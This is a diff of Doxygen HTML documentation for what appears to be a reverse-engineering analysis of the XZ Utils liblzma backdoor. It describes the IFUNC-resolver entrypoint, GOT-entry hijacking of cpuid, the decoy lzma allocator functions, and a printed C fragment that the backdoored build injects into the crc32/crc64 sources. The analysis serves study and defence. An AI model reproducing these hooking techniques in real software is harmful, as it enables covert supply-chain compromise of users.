+<tr class="memdesc:ad3a61f27a1663eb3e0b25b861c85fe3c"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds the __tls_get_addr() GOT entry  <a href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c">More...</a><br /></td></tr>
+<tr class="separator:ad3a61f27a1663eb3e0b25b861c85fe3c"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:ae20580c7a069afb3b578f060582867df"><td class="memItemLeft" align="right" valign="top">ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df">get_tls_get_addr_random_symbol_got_offset</a> (<a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *ctx)</td></tr>
+<tr class="memdesc:ae20580c7a069afb3b578f060582867df"><td class="mdescLeft">&#160;</td><td class="mdescRight">get the tls_get_addr_random_symbol GOT offset  <a href="xzre_8h.html#ae20580c7a069afb3b578f060582867df">More...</a><br /></td></tr>
+<tr class="separator:ae20580c7a069afb3b578f060582867df"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:a60ba9b591b9f0b10a78ea2136a0a3adc"><td class="memItemLeft" align="right" valign="top">uintptr_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc">backdoor_symbind64</a> (Elf64_Sym *sym, unsigned int ndx, uptr *refcook, uptr *defcook, unsigned int flags, const char *symname)</td></tr>
 <tr class="memdesc:a60ba9b591b9f0b10a78ea2136a0a3adc"><td class="mdescLeft">&#160;</td><td class="mdescRight">the backdoored symbind64 installed in GLRO(dl_audit)  <a href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc">More...</a><br /></td></tr>
 <tr class="separator:a60ba9b591b9f0b10a78ea2136a0a3adc"><td class="memSeparator" colspan="2">&#160;</td></tr>
 </table><table class="memberdecls">
 <tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="var-members"></a>
 Variables</h2></td></tr>
-<tr class="memitem:ab9c7b9765c15a48fbed3d1a8daf1b27f"><td class="memItemLeft" align="right" valign="top"><a id="ab9c7b9765c15a48fbed3d1a8daf1b27f"></a>
-u32&#160;</td><td class="memItemRight" valign="bottom"><b>resolver_call_count</b></td></tr>
+<tr class="memitem:ab9c7b9765c15a48fbed3d1a8daf1b27f"><td class="memItemLeft" align="right" valign="top">u32&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ab9c7b9765c15a48fbed3d1a8daf1b27f">resolver_call_count</a></td></tr>
+<tr class="memdesc:ab9c7b9765c15a48fbed3d1a8daf1b27f"><td class="mdescLeft">&#160;</td><td class="mdescRight">counts the number of times the IFUNC resolver is called  <a href="xzre_8h.html#ab9c7b9765c15a48fbed3d1a8daf1b27f">More...</a><br /></td></tr>
 <tr class="separator:ab9c7b9765c15a48fbed3d1a8daf1b27f"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:aba335b5173c376997dd9e8686255413c"><td class="memItemLeft" align="right" valign="top"><a id="aba335b5173c376997dd9e8686255413c"></a>
 <a class="el" href="structglobal__context__t.html">global_context_t</a> *&#160;</td><td class="memItemRight" valign="bottom"><b>global_ctx</b></td></tr>
 <tr class="separator:aba335b5173c376997dd9e8686255413c"><td class="memSeparator" colspan="2">&#160;</td></tr>
-<tr class="memitem:a678f0c54a17ceaf00ce3a00edb27de10"><td class="memItemLeft" align="right" valign="top"><a id="a678f0c54a17ceaf00ce3a00edb27de10"></a>
-lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma_allocator</b></td></tr>
+<tr class="memitem:a678f0c54a17ceaf00ce3a00edb27de10"><td class="memItemLeft" align="right" valign="top">lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a678f0c54a17ceaf00ce3a00edb27de10">fake_lzma_allocator</a></td></tr>
+<tr class="memdesc:a678f0c54a17ceaf00ce3a00edb27de10"><td class="mdescLeft">&#160;</td><td class="mdescRight">the fake lzma_allocator which makes lzma_alloc() call <a class="el" href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584" title="a fake free function called by lzma_free() that then calls elf_symbol_get_addr()">fake_lzma_alloc()</a>  <a href="xzre_8h.html#a678f0c54a17ceaf00ce3a00edb27de10">More...</a><br /></td></tr>
 <tr class="separator:a678f0c54a17ceaf00ce3a00edb27de10"><td class="memSeparator" colspan="2">&#160;</td></tr>
 <tr class="memitem:a2e97de324325b6f39d65b1346f09652c"><td class="memItemLeft" align="right" valign="top"><a id="a2e97de324325b6f39d65b1346f09652c"></a>
 <a class="el" href="structbackdoor__hooks__data__t.html">backdoor_hooks_data_t</a> **&#160;</td><td class="memItemRight" valign="bottom"><b>hooks_data_addr</b></td></tr>
 <tr class="separator:a2e97de324325b6f39d65b1346f09652c"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:ac7d6a45076bf21904bac3163ae57090e"><td class="memItemLeft" align="right" valign="top">const u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ac7d6a45076bf21904bac3163ae57090e">cpuid_random_symbol</a></td></tr>
+<tr class="memdesc:ac7d6a45076bf21904bac3163ae57090e"><td class="mdescLeft">&#160;</td><td class="mdescRight">a bogus global variable that is used by the backdoor to generate an extra symbol  <a href="xzre_8h.html#ac7d6a45076bf21904bac3163ae57090e">More...</a><br /></td></tr>
+<tr class="separator:ac7d6a45076bf21904bac3163ae57090e"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a3101b150fe0226a632314e2fa473aba1"><td class="memItemLeft" align="right" valign="top">const u64&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a3101b150fe0226a632314e2fa473aba1">tls_get_addr_random_symbol</a></td></tr>
+<tr class="memdesc:a3101b150fe0226a632314e2fa473aba1"><td class="mdescLeft">&#160;</td><td class="mdescRight">a bogus global variable that is used by the backdoor to generate an extra symbol  <a href="xzre_8h.html#a3101b150fe0226a632314e2fa473aba1">More...</a><br /></td></tr>
+<tr class="separator:a3101b150fe0226a632314e2fa473aba1"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a6ee0871d6d6f7544176777c8f00244b7"><td class="memItemLeft" align="right" valign="top">const <a class="el" href="structbackdoor__cpuid__reloc__consts__t.html">backdoor_cpuid_reloc_consts_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6ee0871d6d6f7544176777c8f00244b7">cpuid_reloc_consts</a></td></tr>
+<tr class="memdesc:a6ee0871d6d6f7544176777c8f00244b7"><td class="mdescLeft">&#160;</td><td class="mdescRight">special section that contains <a class="el" href="xzre_8h.html#aed5d1b3446090d6186a41841fb282df1" title="actually calls cpuid instruction">_cpuid()</a> related GOT offsets  <a href="xzre_8h.html#a6ee0871d6d6f7544176777c8f00244b7">More...</a><br /></td></tr>
+<tr class="separator:a6ee0871d6d6f7544176777c8f00244b7"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:aadd306e1b2b33d0306f1995e0a83dae7"><td class="memItemLeft" align="right" valign="top">const <a class="el" href="structbackdoor__tls__get__addr__reloc__consts__t.html">backdoor_tls_get_addr_reloc_consts_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aadd306e1b2b33d0306f1995e0a83dae7">tls_get_addr_reloc_consts</a></td></tr>
+<tr class="memdesc:aadd306e1b2b33d0306f1995e0a83dae7"><td class="mdescLeft">&#160;</td><td class="mdescRight">special section that contains __tls_get_addr() related GOT offsets  <a href="xzre_8h.html#aadd306e1b2b33d0306f1995e0a83dae7">More...</a><br /></td></tr>
+<tr class="separator:aadd306e1b2b33d0306f1995e0a83dae7"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"><td class="memItemLeft" align="right" valign="top">const ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aaab5bc3cf0e40bb0aa5bc72a3fd05fbe">fake_lzma_allocator_offset</a></td></tr>
+<tr class="memdesc:aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"><td class="mdescLeft">&#160;</td><td class="mdescRight">special section that contains the offset to lzma_allocator_struct  <a href="xzre_8h.html#aaab5bc3cf0e40bb0aa5bc72a3fd05fbe">More...</a><br /></td></tr>
+<tr class="separator:aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a4623e8d4254091bcbffbead1ee7ed2ff"><td class="memItemLeft" align="right" valign="top">const ptrdiff_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a4623e8d4254091bcbffbead1ee7ed2ff">elf_functions_offset</a></td></tr>
+<tr class="memdesc:a4623e8d4254091bcbffbead1ee7ed2ff"><td class="mdescLeft">&#160;</td><td class="mdescRight">special section that contains the offset to elf_functions  <a href="xzre_8h.html#a4623e8d4254091bcbffbead1ee7ed2ff">More...</a><br /></td></tr>
+<tr class="separator:a4623e8d4254091bcbffbead1ee7ed2ff"><td class="memSeparator" colspan="2">&#160;</td></tr>
+<tr class="memitem:a43a1216740525fdfa050474fc9b91a57"><td class="memItemLeft" align="right" valign="top">const <a class="el" href="structelf__functions__t.html">elf_functions_t</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a43a1216740525fdfa050474fc9b91a57">elf_functions</a></td></tr>
+<tr class="memdesc:a43a1216740525fdfa050474fc9b91a57"><td class="mdescLeft">&#160;</td><td class="mdescRight">special section that contains addresses to various functions  <a href="xzre_8h.html#a43a1216740525fdfa050474fc9b91a57">More...</a><br /></td></tr>
+<tr class="separator:a43a1216740525fdfa050474fc9b91a57"><td class="memSeparator" colspan="2">&#160;</td></tr>
 </table>
 <a name="details" id="details"></a><h2 class="groupheader">Detailed Description</h2>
 <div class="textblock"><p>XZ backdoor structures and functions. </p>
@@ -1140,47 +1227,41 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
 </div>
 </div>
 <h2 class="groupheader">Function Documentation</h2>
-<a id="ab58b3c83a6d06a652fbc65c2271f5d13"></a>
-<h2 class="memtitle"><span class="permalink"><a href="#ab58b3c83a6d06a652fbc65c2271f5d13">&#9670;&nbsp;</a></span>_get_cpuid()</h2>
+<a id="aed5d1b3446090d6186a41841fb282df1"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#aed5d1b3446090d6186a41841fb282df1">&#9670;&nbsp;</a></span>_cpuid()</h2>
 
 <div class="memitem">
 <div class="memproto">
       <table class="memname">
         <tr>
-          <td class="memname">BOOL _get_cpuid </td>
+          <td class="memname">void _cpuid </td>
           <td>(</td>
-          <td class="paramtype">int&#160;</td>
-          <td class="paramname"><em>cpuid_request</em>, </td>
+          <td class="paramtype">unsigned int&#160;</td>
+          <td class="paramname"><em>level</em>, </td>
         </tr>
         <tr>
           <td class="paramkey"></td>
           <td></td>
-          <td class="paramtype">void *&#160;</td>
-          <td class="paramname">, </td>
+          <td class="paramtype">unsigned int *&#160;</td>
+          <td class="paramname"><em>a</em>, </td>
         </tr>
         <tr>
           <td class="paramkey"></td>
           <td></td>
-          <td class="paramtype">void *&#160;</td>
-          <td class="paramname">, </td>
+          <td class="paramtype">unsigned int *&#160;</td>
+          <td class="paramname"><em>b</em>, </td>
         </tr>
         <tr>
           <td class="paramkey"></td>
           <td></td>
-          <td class="paramtype">void *&#160;</td>
-          <td class="paramname">, </td>
+          <td class="paramtype">unsigned int *&#160;</td>
+          <td class="paramname"><em>c</em>, </td>
         </tr>
         <tr>
           <td class="paramkey"></td>
           <td></td>
-          <td class="paramtype">void *&#160;</td>
-          <td class="paramname">, </td>
-        </tr>
-        <tr>
-          <td class="paramkey"></td>
-          <td></td>
-          <td class="paramtype">void *&#160;</td>
-          <td class="paramname">&#160;</td>
+          <td class="paramtype">unsigned int *&#160;</td>
+          <td class="paramname"><em>d</em>&#160;</td>
         </tr>
         <tr>
           <td></td>
@@ -1190,14 +1271,196 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
       </table>
 </div><div class="memdoc">
 
-<p>the backdoor entrypoint function, called by the IFUNC resolver </p>
+<p>actually calls cpuid instruction </p>
+<p>this is a copy of __cpuid() from gcc</p>
 <dl class="params"><dt>Parameters</dt><dd>
   <table class="params">
-    <tr><td class="paramname">cpuid_request</td><td></td></tr>
+    <tr><td class="paramname">level</td><td>EAX register input for cpuid instruction </td></tr>
+    <tr><td class="paramname">a</td><td>EAX register output for cpuid instruction </td></tr>
+    <tr><td class="paramname">b</td><td>EBX register output for cpuid instruction </td></tr>
+    <tr><td class="paramname">c</td><td>ECX register output for cpuid instruction </td></tr>
+    <tr><td class="paramname">d</td><td>EDX register output for cpuid instruction </td></tr>
   </table>
   </dd>
 </dl>
-<dl class="section return"><dt>Returns</dt><dd>BOOL </dd></dl>
+
+</div>
+</div>
+<a id="a3c1f9d6a6a722f65a4fc7530ec2ffe2e"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#a3c1f9d6a6a722f65a4fc7530ec2ffe2e">&#9670;&nbsp;</a></span>_get_cpuid()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">unsigned int _get_cpuid </td>
+          <td>(</td>
+          <td class="paramtype">unsigned int&#160;</td>
+          <td class="paramname"><em>leaf</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">unsigned int *&#160;</td>
+          <td class="paramname"><em>eax</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">unsigned int *&#160;</td>
+          <td class="paramname"><em>ebx</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">unsigned int *&#160;</td>
+          <td class="paramname"><em>ecx</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">unsigned int *&#160;</td>
+          <td class="paramname"><em>edx</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">u64 *&#160;</td>
+          <td class="paramname"><em>caller_frame</em>&#160;</td>
+        </tr>
+        <tr>
+          <td></td>
+          <td>)</td>
+          <td></td><td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>the backdoor entrypoint function, called by the IFUNC resolver for liblzma crc32() and crc64() </p>
+<p>calls <a class="el" href="xzre_8h.html#a3659cb57f57dd0237ecb194e13d35b19" title="calls call_backdoor_init_stage2() while in the crc64() IFUNC resolver function">backdoor_init()</a></p>
+<p>this is a copy of __get_cpuid() from gcc</p>
+<p>for context this is the extra code the backdoor build inserts into both xz/src/liblzma/check/crc32_fast.c and xz/src/liblzma/check/crc64_fast.c </p><div class="fragment"><div class="line"><span class="preprocessor">#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))</span></div>
+<div class="line"><span class="keywordtype">int</span> <a class="code" href="xzre_8h.html#a3c1f9d6a6a722f65a4fc7530ec2ffe2e">_get_cpuid</a>(<span class="keywordtype">int</span>, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*);</div>
+<div class="line"> </div>
+<div class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keywordtype">bool</span> _is_arch_extension_supported(<span class="keywordtype">void</span>) {</div>
+<div class="line">  <span class="keywordtype">int</span> success = 1;</div>
+<div class="line">  uint32_t r[4];</div>
+<div class="line">  success = <a class="code" href="xzre_8h.html#a3c1f9d6a6a722f65a4fc7530ec2ffe2e">_get_cpuid</a>(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((<span class="keywordtype">char</span>*) __builtin_frame_address(0))-16);</div>
+<div class="line">  <span class="keyword">const</span> uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19);</div>
+<div class="line">  <span class="keywordflow">return</span> success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask;</div>
+<div class="line">}</div>
+<div class="line"> </div>
+<div class="line"><span class="preprocessor">#else</span></div>
+<div class="line"><span class="preprocessor">#define _is_arch_extension_supported() is_arch_extension_supported</span></div>
+<div class="line"><span class="preprocessor">#endif </span></div>
+<div class="ttc" id="axzre_8h_html_a3c1f9d6a6a722f65a4fc7530ec2ffe2e"><div class="ttname"><a href="xzre_8h.html#a3c1f9d6a6a722f65a4fc7530ec2ffe2e">_get_cpuid</a></div><div class="ttdeci">unsigned int _get_cpuid(unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame)</div><div class="ttdoc">the backdoor entrypoint function, called by the IFUNC resolver for liblzma crc32() and crc64()</div></div>
+</div><!-- fragment --><p>the <a class="el" href="xzre_8h.html#a3c1f9d6a6a722f65a4fc7530ec2ffe2e" title="the backdoor entrypoint function, called by the IFUNC resolver for liblzma crc32() and crc64()">_get_cpuid()</a> function is defined in the file liblzma_la-crc64-fast.o which is linked into liblzma to bring in the backdoor's code</p>
+<p>the _is_arch_extension_supported is a modified version of is_arch_extension_supported() from xz/src/liblzma/check/crc_x86_clmul.h</p>
+<p>additionally both xz/src/liblzma/check/crc32_fast.c and xz/src/liblzma/check/crc64_fast.c are modified to replace the call to is_arch_extension_supported() with _is_arch_extension_supported()</p>
+<dl class="params"><dt>Parameters</dt><dd>
+  <table class="params">
+    <tr><td class="paramname">leaf</td><td>EAX register input for cpuid instruction </td></tr>
+    <tr><td class="paramname">eax</td><td>EAX register output for cpuid instruction </td></tr>
+    <tr><td class="paramname">ebx</td><td>EBX register output for cpuid instruction </td></tr>
+    <tr><td class="paramname">ecx</td><td>ECX register output for cpuid instruction </td></tr>
+    <tr><td class="paramname">edx</td><td>EDX register output for cpuid instruction </td></tr>
+    <tr><td class="paramname">caller_frame</td><td>the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
+  </table>
+  </dd>
+</dl>
+<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if cpuid leaf supported, FALSE otherwise </dd></dl>
+
+</div>
+</div>
+<a id="a3659cb57f57dd0237ecb194e13d35b19"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#a3659cb57f57dd0237ecb194e13d35b19">&#9670;&nbsp;</a></span>backdoor_init()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">unsigned int backdoor_init </td>
+          <td>(</td>
+          <td class="paramtype">unsigned int&#160;</td>
+          <td class="paramname"><em>ext</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">u64 *&#160;</td>
+          <td class="paramname"><em>caller_frame</em>&#160;</td>
+        </tr>
+        <tr>
+          <td></td>
+          <td>)</td>
+          <td></td><td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>calls <a class="el" href="xzre_8h.html#ac7c10c84bc0699f1ba58698764ae0258" title="calls backdoor_init_stage2()">call_backdoor_init_stage2()</a> while in the crc64() IFUNC resolver function </p>
+<p>the function counts the number of times it was called in resolver_call_count</p>
+<p>the first time it is called is in the crc32() resolver just returns the maximum supported cpuid level</p>
+<p>the second time it is called is in the crc64() resolver and then this function calls <a class="el" href="xzre_8h.html#ac7c10c84bc0699f1ba58698764ae0258" title="calls backdoor_init_stage2()">call_backdoor_init_stage2()</a></p>
+<p>this is a modified version of __get_cpuid_max() from gcc</p>
+<dl class="params"><dt>Parameters</dt><dd>
+  <table class="params">
+    <tr><td class="paramname">ext</td><td>EAX register input. Is either 0 or 0x80000000, but this value is actually not used. </td></tr>
+    <tr><td class="paramname">caller_frame</td><td>the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
+  </table>
+  </dd>
+</dl>
+<dl class="section return"><dt>Returns</dt><dd>unsigned int the EAX register output. Normally the maximum supported cpuid level. </dd></dl>
+
+</div>
+</div>
+<a id="a8ab85586c2cbdd03ee2f734b92e3e3d6"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#a8ab85586c2cbdd03ee2f734b92e3e3d6">&#9670;&nbsp;</a></span>backdoor_init_stage2()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">BOOL backdoor_init_stage2 </td>
+          <td>(</td>
+          <td class="paramtype"><a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *&#160;</td>
+          <td class="paramname"><em>ctx</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">u64 *&#160;</td>
+          <td class="paramname"><em>caller_frame</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">void **&#160;</td>
+          <td class="paramname"><em>cpuid_got_addr</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype"><a class="el" href="structbackdoor__cpuid__reloc__consts__t.html">backdoor_cpuid_reloc_consts_t</a> *&#160;</td>
+          <td class="paramname"><em>reloc_consts</em>&#160;</td>
+        </tr>
+        <tr>
+          <td></td>
+          <td>)</td>
+          <td></td><td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+<dl class="params"><dt>Parameters</dt><dd>
+  <table class="params">
+    <tr><td class="paramname">ctx</td><td>holds values needed to setup the <a class="el" href="xzre_8h.html#aed5d1b3446090d6186a41841fb282df1" title="actually calls cpuid instruction">_cpuid()</a>, passed to <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </td></tr>
+    <tr><td class="paramname">caller_frame</td><td>stores the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
+    <tr><td class="paramname">cpuid_got_addr</td><td>address of the cpuid() GOT entry </td></tr>
+    <tr><td class="paramname">reloc_consts</td><td>pointer to cpuid_reloc_consts </td></tr>
+  </table>
+  </dd>
+</dl>
+<dl class="section return"><dt>Returns</dt><dd>BOOL the value <a class="el" href="structelf__entry__ctx__t.html#a981d9d100fcb877d5c77a16059bd47ac" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a> if the cpuid() GOT entry was NULL, otherwise the return value of <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </dd></dl>
 
 </div>
 </div>
@@ -1291,6 +1554,46 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
   </dd>
 </dl>
 <dl class="section return"><dt>Returns</dt><dd>uintptr_t </dd></dl>
+
+</div>
+</div>
+<a id="ac7c10c84bc0699f1ba58698764ae0258"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#ac7c10c84bc0699f1ba58698764ae0258">&#9670;&nbsp;</a></span>call_backdoor_init_stage2()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">void* call_backdoor_init_stage2 </td>
+          <td>(</td>
+          <td class="paramtype"><a class="el" href="structelf__entry__ctx__t.html">elf_entry_ctx_t</a> *&#160;</td>
+          <td class="paramname"><em>ctx</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">u64 *&#160;</td>
+          <td class="paramname"><em>caller_frame</em>&#160;</td>
+        </tr>
+        <tr>
+          <td></td>
+          <td>)</td>
+          <td></td><td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>calls <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </p>
+<p><a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> is called by replacing the <a class="el" href="xzre_8h.html#aed5d1b3446090d6186a41841fb282df1" title="actually calls cpuid instruction">_cpuid()</a> GOT entry to point to <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a></p>
+<p>stores <a class="el" href="structelf__entry__ctx__t.html#ad01fe86502a221ee8a55703ca7875f58" title="points to a symbol in memory will be used to find the GOT value">elf_entry_ctx_t::symbol_ptr</a> - <a class="el" href="structelf__entry__ctx__t.html#af75bd9706dff28ecdc39c1c14765e873" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a> in <a class="el" href="structelf__entry__ctx__t.html#a981d9d100fcb877d5c77a16059bd47ac" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a> which is the GOT address</p>
+<dl class="params"><dt>Parameters</dt><dd>
+  <table class="params">
+    <tr><td class="paramname">ctx</td><td>holds values needed to setup the <a class="el" href="xzre_8h.html#aed5d1b3446090d6186a41841fb282df1" title="actually calls cpuid instruction">_cpuid()</a>, passed to <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </td></tr>
+    <tr><td class="paramname">caller_frame</td><td>the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
+  </table>
+  </dd>
+</dl>
+<dl class="section return"><dt>Returns</dt><dd>void* the value <a class="el" href="structelf__entry__ctx__t.html#a981d9d100fcb877d5c77a16059bd47ac" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a> if the cpuid() GOT entry was NULL, otherwise the return value of <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </dd></dl>
 
 </div>
 </div>
@@ -1412,8 +1715,8 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
 
 </div>
 </div>
-<a id="a0adc703b5d67d3b105dc16a6a3ed9719"></a>
-<h2 class="memtitle"><span class="permalink"><a href="#a0adc703b5d67d3b105dc16a6a3ed9719">&#9670;&nbsp;</a></span>elf_find_string()</h2>
+<a id="ad86c0039d3a08468f5cf7187662ebab9"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#ad86c0039d3a08468f5cf7187662ebab9">&#9670;&nbsp;</a></span>elf_find_string()</h2>
 
 <div class="memitem">
 <div class="memproto">
@@ -1427,7 +1730,7 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
         <tr>
           <td class="paramkey"></td>
           <td></td>
-          <td class="paramtype">u32 *&#160;</td>
+          <td class="paramtype">EncodedStringId *&#160;</td>
           <td class="paramname"><em>stringId_inOut</em>, </td>
         </tr>
         <tr>
@@ -1932,6 +2235,89 @@ lzma_allocator *&#160;</td><td class="memItemRight" valign="bottom"><b>fake_lzma
 
 </div>
 </div>
+<a id="aeb6b7e7363a9d706fdd3704ef5faf584"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#aeb6b7e7363a9d706fdd3704ef5faf584">&#9670;&nbsp;</a></span>fake_lzma_alloc()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">void* fake_lzma_alloc </td>
+          <td>(</td>
+          <td class="paramtype">void *&#160;</td>
+          <td class="paramname"><em>opaque</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">size_t&#160;</td>
+          <td class="paramname"><em>nmemb</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">size_t&#160;</td>
+          <td class="paramname"><em>size</em>&#160;</td>
+        </tr>
+        <tr>
+          <td></td>
+          <td>)</td>
+          <td></td><td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>a fake free function called by lzma_free() that then calls <a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109" title="Looks up an ELF symbol from a parsed ELF, and returns its memory address.">elf_symbol_get_addr()</a> </p>
+<dl class="params"><dt>Parameters</dt><dd>
+  <table class="params">
+    <tr><td class="paramname">opaque</td><td>the parsed ELF context (elf_info_t*) </td></tr>
+    <tr><td class="paramname">nmemb</td><td>not used </td></tr>
+    <tr><td class="paramname">size</td><td>string ID of the symbol name (EncodedStringId) </td></tr>
+  </table>
+  </dd>
+</dl>
+<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol </dd></dl>
+
+</div>
+</div>
+<a id="a5565761b59b3ef6786b83a9b50f72b17"></a>
+<h2 class="memtitle"><span class="permalink"><a href="#a5565761b59b3ef6786b83a9b50f72b17">&#9670;&nbsp;</a></span>fake_lzma_free()</h2>
+
+<div class="memitem">
+<div class="memproto">
+      <table class="memname">
+        <tr>
+          <td class="memname">void fake_lzma_free </td>
+          <td>(</td>
+          <td class="paramtype">void *&#160;</td>
+          <td class="paramname"><em>opaque</em>, </td>
+        </tr>
+        <tr>
+          <td class="paramkey"></td>
+          <td></td>
+          <td class="paramtype">void *&#160;</td>
+          <td class="paramname"><em>ptr</em>&#160;</td>
+        </tr>
+        <tr>
+          <td></td>
+          <td>)</td>
+          <td></td><td></td>
+        </tr>
+      </table>
+</div><div class="memdoc">
+
+<p>a fake free function called by lzma_free() </p>
+<p>this function is a red herring as it is does nothing except make it look like lzma_alloc() is the real deal</p>
